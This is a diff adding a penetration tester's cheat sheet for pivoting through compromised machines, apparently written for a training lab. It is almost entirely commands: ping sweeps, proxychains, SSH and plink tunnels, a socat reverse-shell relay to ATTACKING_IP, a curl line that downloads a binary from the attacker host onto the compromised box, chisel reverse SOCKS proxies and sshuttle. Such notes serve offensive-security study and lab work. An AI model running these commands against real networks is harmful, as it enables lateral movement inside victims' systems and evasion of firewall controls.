@@ -1,0 +1,121 @@
+### pivot ###
+## metasploit ##
+portfwd
+
+
+## static ##
+https://github.com/andrew-d/static-binaries
+https://github.com/ernw/static-toolbox/
+
+
+## ping sweep ##
+for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep "bytes from" &); done
+on windows
+	https://github.com/MuirlandOracle/C-Sharp-Port-Scan
+	https://github.com/MuirlandOracle/CPP-Port-Scanner
+
+
+## proxychains ##
+cp /etc/proxychains.conf .
+# proxy_dns
+# socks4  127.0.0.1 9050
+socks5 127.0.0.1 1337
+sudo ssh -i key user@$h -D 1337                         #Dynamic port forwarding
+	proxychains nmap -sT 127.0.0.1			#run nmap
+	proxychains nmap -sV -T5 -p 80,3306 127.0.0.1	#run nmap
+
+
+## forward connections ##
+sudo ssh user@$h -D 1337				#Dynamic port forwarding
+ssh -L 10000:localhost:10000 user@$h			#local port forwarding port:local:remote port
+ssh -L 8000:127.0.0.1:80 user@$h -N			#localhost:8000 to access internal 80
+sudo ssh -L 139:172.18.0.2:139 user@$h -N		#-N dont exec remote cmd
+
+
+## reverse connections ##				#got shell but no SSH on compromised machine
+ssh-keygen						#./reverse
+	# put .pub in ~/.ssh/authorized_keys on local
+	# command="echo 'For port forwarding only'",no-agent-forwarding,no-x11-forwarding,no-pty
+	# + copy/paste .pub key
+	sudo systemctl start ssh			#local machine
+	# copy private key to compromised machine (DONT)
+	ssh -R 8000:172.16.0.10:80 your_user@local_ip -i key -fN
+
+
+## plink.exe ##						#reverse connections for windows
+https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html
+ssh-keygen #./reverse
+puttygen reverse -o out.ppk
+cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT your_user@local_ip -i out.ppk -N
+
+
+## socat ##
+https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat
+https://sourceforge.net/projects/unix-utils/files/socat/
+sudo python3 -m http.server 80
+curl ATTACKING_IP/socat -o /tmp/socat && chmod +x /tmp/socat
+
+reverse shell relay	# compromised server act as a relay to send reverse shell from target to local
+	sudo nc -lvnp 443						#on attacking box
+	./socat tcp-l:8000 tcp:ATTACKING_IP:443 &			#relay on compromised server
+
+port forwarding		# compromised server act as a relay, forward local cmd to target 172.16.0.10:3306
+	./socat tcp-l:33060,fork,reuseaddr tcp:172.16.0.10:3306 &
+
+port forwardinf quiet	# same but more silent
+	socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &			#on attacking box
+	./socat tcp:ATTACKING_IP:8001 tcp:172.16.0.10:80,fork &		#relay on compromised server
+	# 127.0.0.1:8000 => 127.0.0.1:8001 => relay => 172.16.0.10:80
+	jobs								#list background jobs
+	kill %NUM							#kill jobs
+
+
+## chisel ##	# set up proxy tunneling or port forward but doesn't need SSH access
+https://github.com/jpillora/chisel
+
+reverse socks proxy	#egress traffic, firewall less stringent
+	./chisel server -p 1337 --reverse &				#on attacking box
+	# connect to our chisel server
+	./chisel client ATTACKING_IP:1337 R:socks &			#on compromised box
+	socks5 127.0.0.1 1080
+
+forward socks proxy	#ingreee traffic, be carefull of firewalls
+	./chisel server -p 8080 --socks5				#on compromised box
+	# connect to chisel server
+	./chisel client target_ip:8080 1337:socks			#on attacking box
+	socks5 127.0.0.1 1337
+
+remote port forward	#act as relay from local:2222 to target:22
+	./chisel server -p 1337 --reverse &				#on attacking box
+	# connect to our chisel server, open compromised:2222 and link to 172.16.0.10:22, background process
+	./chisel client ATTACKING_IP:1337 R:2222:172.16.0.10:22 &	#on compromised box
+	./chisel client 10.8.98.114:1337  R:2222:127.0.0.1:8080 &	#or link to internal port
+
+local port forward	#act as relay from local:222 to target:22
+	./chisel server -p 8000						#on compromised box
+	# connect to chisel server, open local:2222 and link to 172.16.0.10:22
+	./chisel client 172.16.0.5:8000 2222:172.16.0.10:22		#on attacking box
+
+jobs									#list background jobs
+kill %NUM								#kill jobs
+
+
+## netcat ##
+	# listen on unfiltered port 443 and forward to another port
+	ncat -lvnp 443 -c "ncat TARGET_IP 25"				#on compromised box
+	ncat -ulvnp 53							#use UDP
+
+	ncat -ulvnp 53 / ncat -u 10.8.98.114 53
+	ncat -lvnp 80 / ncat 10.8.98.114 80
+
+
+
+## sshuttle ## # only linux+python, simulates a VPN
+sshuttle -r username@address subnet
+sshuttle -r user@172.16.0.5 172.16.0.0/24 -x 172.16.0.5			#x excluse compromised from subnet
+sshuttle -r user@172.16.0.5 -N						#try determine subnet auto
+sshuttle -r user@172.16.0.5 -N & 					#could be backgrounded
+
+sshuttle -r user@172.16.0.5 --ssh-cmd "ssh -i key" 172.16.0.0/24	#with key
+
+
